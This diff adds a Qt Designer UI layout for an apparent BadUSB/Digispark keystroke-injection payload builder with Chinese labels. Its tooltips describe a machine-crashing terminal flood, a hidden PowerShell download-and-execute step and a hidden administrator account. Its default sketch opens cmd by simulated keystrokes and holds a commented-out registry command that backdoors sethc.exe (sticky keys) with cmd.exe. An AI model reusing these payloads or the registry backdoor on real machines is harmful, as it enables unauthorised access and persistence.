@@ -1,0 +1,575 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>MainWindow</class>
+ <widget class="QMainWindow" name="MainWindow">
+  <property name="geometry">
+   <rect>
+    <x>0</x>
+    <y>0</y>
+    <width>912</width>
+    <height>805</height>
+   </rect>
+  </property>
+  <property name="windowTitle">
+   <string>MainWindow</string>
+  </property>
+  <widget class="QWidget" name="centralwidget">
+   <layout class="QGridLayout" name="gridLayout_4">
+    <item row="0" column="0">
+     <widget class="QGroupBox" name="groupBox_2">
+      <property name="title">
+       <string>INPUT All In One</string>
+      </property>
+      <layout class="QGridLayout" name="gridLayout_2">
+       <item row="1" column="0">
+        <widget class="QSplitter" name="splitter_4">
+         <property name="orientation">
+          <enum>Qt::Horizontal</enum>
+         </property>
+         <widget class="QSplitter" name="splitter">
+          <property name="orientation">
+           <enum>Qt::Vertical</enum>
+          </property>
+          <widget class="QLabel" name="label_3">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string>按键识别输入</string>
+           </property>
+          </widget>
+          <widget class="QLabel" name="label">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string>打印字符串</string>
+           </property>
+          </widget>
+          <widget class="QLabel" name="label_2">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string>Sleep</string>
+           </property>
+          </widget>
+         </widget>
+         <widget class="QSplitter" name="splitter_2">
+          <property name="orientation">
+           <enum>Qt::Vertical</enum>
+          </property>
+          <widget class="QLineEdit" name="le_ci">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string/>
+           </property>
+          </widget>
+          <widget class="QLineEdit" name="le_ps">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string/>
+           </property>
+          </widget>
+          <widget class="QSpinBox" name="sp_ms">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="suffix">
+            <string>ms</string>
+           </property>
+           <property name="prefix">
+            <string/>
+           </property>
+           <property name="maximum">
+            <number>100000</number>
+           </property>
+           <property name="singleStep">
+            <number>100</number>
+           </property>
+           <property name="value">
+            <number>800</number>
+           </property>
+          </widget>
+         </widget>
+         <widget class="QSplitter" name="splitter_3">
+          <property name="orientation">
+           <enum>Qt::Vertical</enum>
+          </property>
+          <widget class="QComboBox" name="cb_ci_ap">
+           <property name="font">
+            <font>
+             <family>aakar</family>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="currentIndex">
+            <number>0</number>
+           </property>
+           <property name="insertPolicy">
+            <enum>QComboBox::InsertAtBottom</enum>
+           </property>
+           <item>
+            <property name="text">
+             <string>单击</string>
+            </property>
+           </item>
+           <item>
+            <property name="text">
+             <string>按下</string>
+            </property>
+           </item>
+           <item>
+            <property name="text">
+             <string>松开</string>
+            </property>
+           </item>
+          </widget>
+          <widget class="QPushButton" name="pb_ps_ap">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string>添加</string>
+           </property>
+          </widget>
+          <widget class="QPushButton" name="pb_sp_ap">
+           <property name="font">
+            <font>
+             <pointsize>14</pointsize>
+            </font>
+           </property>
+           <property name="text">
+            <string>添加</string>
+           </property>
+          </widget>
+         </widget>
+        </widget>
+       </item>
+       <item row="0" column="0">
+        <widget class="QSplitter" name="splitter_5">
+         <property name="orientation">
+          <enum>Qt::Horizontal</enum>
+         </property>
+         <widget class="QPushButton" name="pb_od">
+          <property name="font">
+           <font>
+            <pointsize>20</pointsize>
+           </font>
+          </property>
+          <property name="text">
+           <string>点击选择输入</string>
+          </property>
+         </widget>
+         <widget class="QPushButton" name="pb_sk">
+          <property name="font">
+           <font>
+            <pointsize>20</pointsize>
+           </font>
+          </property>
+          <property name="text">
+           <string>模拟键盘输入</string>
+          </property>
+         </widget>
+        </widget>
+       </item>
+      </layout>
+     </widget>
+    </item>
+    <item row="0" column="1">
+     <widget class="QGroupBox" name="groupBox_3">
+      <property name="title">
+       <string>Ctrl + V</string>
+      </property>
+      <layout class="QGridLayout" name="gridLayout_3">
+       <item row="2" column="0">
+        <widget class="QPushButton" name="pb_qc3">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="toolTip">
+          <string>打开模糊的Windows终端，使其无法控制地自我复制，从而导致机器锁定或崩溃</string>
+         </property>
+         <property name="text">
+          <string>无限终端</string>
+         </property>
+        </widget>
+       </item>
+       <item row="3" column="0">
+        <widget class="QPushButton" name="pb_qc2">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="toolTip">
+          <string>使用Powershell使计算机说出一条消息</string>
+         </property>
+         <property name="text">
+          <string>PowerShell讲话</string>
+         </property>
+        </widget>
+       </item>
+       <item row="0" column="0">
+        <widget class="QPushButton" name="pb_qc1">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="toolTip">
+          <string>以隐藏模式下载并执行Powershell脚本</string>
+         </property>
+         <property name="text">
+          <string>执行PS的PayLoad</string>
+         </property>
+        </widget>
+       </item>
+       <item row="1" column="0">
+        <widget class="QPushButton" name="pb_qc4">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="toolTip">
+          <string>创建一个新的管理员帐户并有选择地将其隐藏</string>
+         </property>
+         <property name="text">
+          <string>隐藏管理员账户</string>
+         </property>
+        </widget>
+       </item>
+      </layout>
+     </widget>
+    </item>
+    <item row="0" column="2">
+     <widget class="QGroupBox" name="groupBox">
+      <property name="title">
+       <string>高级功能</string>
+      </property>
+      <layout class="QGridLayout" name="gridLayout">
+       <item row="1" column="0">
+        <widget class="QPushButton" name="pb_pcr">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="text">
+          <string>预览代码</string>
+         </property>
+        </widget>
+       </item>
+       <item row="0" column="0">
+        <widget class="QPushButton" name="pb_dtd">
+         <property name="font">
+          <font>
+           <pointsize>14</pointsize>
+          </font>
+         </property>
+         <property name="text">
+          <string>DuckySpark 转DigiSpark</string>
+         </property>
+        </widget>
+       </item>
+      </layout>
+     </widget>
+    </item>
+    <item row="1" column="0" colspan="3">
+     <widget class="QPlainTextEdit" name="TextEdit">
+      <property name="font">
+       <font>
+        <pointsize>14</pointsize>
+       </font>
+      </property>
+      <property name="lineWrapMode">
+       <enum>QPlainTextEdit::NoWrap</enum>
+      </property>
+      <property name="plainText">
+       <string>#include &quot;DigiKeyboard.h&quot;
+
+void setup() {
+
+DigiKeyboard.delay(2000);//开机延迟两秒钟，用于系统识别Digispark
+
+DigiKeyboard.sendKeyStroke(0);
+
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//按R和win键，打开运行
+
+DigiKeyboard.delay(100);
+
+DigiKeyboard.println(&quot;cmd&quot;);
+
+DigiKeyboard.delay(500);
+
+DigiKeyboard.sendKeyStroke(KEY_ENTER);//按回车
+
+DigiKeyboard.delay(2000);
+
+//DigiKeyboard.println(&quot;reg add &quot;HKEY_LOCAL_MACHINE'\SOFTWARE'\Microsoft'\Windows NT'\CurrentVersion'\Image File Execution Options'\sethc.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;C:'\windows'\system32'\cmd.exe&quot;);
+
+DigiKeyboard.sendKeyStroke(KEY_ENTER);//按回车
+
+
+
+}
+
+void loop() {
+
+}</string>
+      </property>
+      <property name="centerOnScroll">
+       <bool>false</bool>
+      </property>
+     </widget>
+    </item>
+   </layout>
+  </widget>
+  <widget class="QToolBar" name="toolBar">
+   <property name="windowTitle">
+    <string>toolBar</string>
+   </property>
+   <attribute name="toolBarArea">
+    <enum>TopToolBarArea</enum>
+   </attribute>
+   <attribute name="toolBarBreak">
+    <bool>false</bool>
+   </attribute>
+   <addaction name="action_copy"/>
+   <addaction name="action_clear"/>
+   <addaction name="action_save"/>
+   <addaction name="action_redo"/>
+   <addaction name="action_undo"/>
+   <addaction name="action_seal"/>
+   <addaction name="action_cut"/>
+   <addaction name="action_paste"/>
+   <addaction name="action_zoomin"/>
+   <addaction name="action_zoomout"/>
+   <addaction name="action_font"/>
+  </widget>
+  <widget class="QStatusBar" name="statusBar"/>
+  <action name="action_copy">
+   <property name="text">
+    <string>复制</string>
+   </property>
+  </action>
+  <action name="action_clear">
+   <property name="text">
+    <string>清空</string>
+   </property>
+  </action>
+  <action name="action_save">
+   <property name="text">
+    <string>保存</string>
+   </property>
+  </action>
+  <action name="action_redo">
+   <property name="text">
+    <string>重做</string>
+   </property>
+  </action>
+  <action name="action_undo">
+   <property name="text">
+    <string>撤销</string>
+   </property>
+  </action>
+  <action name="action_seal">
+   <property name="text">
+    <string>全选</string>
+   </property>
+  </action>
+  <action name="action_cut">
+   <property name="text">
+    <string>剪切</string>
+   </property>
+  </action>
+  <action name="action_paste">
+   <property name="text">
+    <string>粘贴</string>
+   </property>
+  </action>
+  <action name="action_zoomin">
+   <property name="text">
+    <string>放大</string>
+   </property>
+  </action>
+  <action name="action_zoomout">
+   <property name="text">
+    <string>缩小</string>
+   </property>
+  </action>
+  <action name="action_font">
+   <property name="text">
+    <string>字体</string>
+   </property>
+  </action>
+ </widget>
+ <resources/>
+ <connections>
+  <connection>
+   <sender>action_zoomin</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>zoomIn()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_undo</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>undo()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_seal</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>selectAll()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_redo</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>redo()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_paste</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>paste()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_cut</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>cut()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_copy</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>copy()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_clear</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>clear()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+  <connection>
+   <sender>action_zoomout</sender>
+   <signal>triggered()</signal>
+   <receiver>TextEdit</receiver>
+   <slot>zoomOut()</slot>
+   <hints>
+    <hint type="sourcelabel">
+     <x>-1</x>
+     <y>-1</y>
+    </hint>
+    <hint type="destinationlabel">
+     <x>463</x>
+     <y>537</y>
+    </hint>
+   </hints>
+  </connection>
+ </connections>
+</ui>
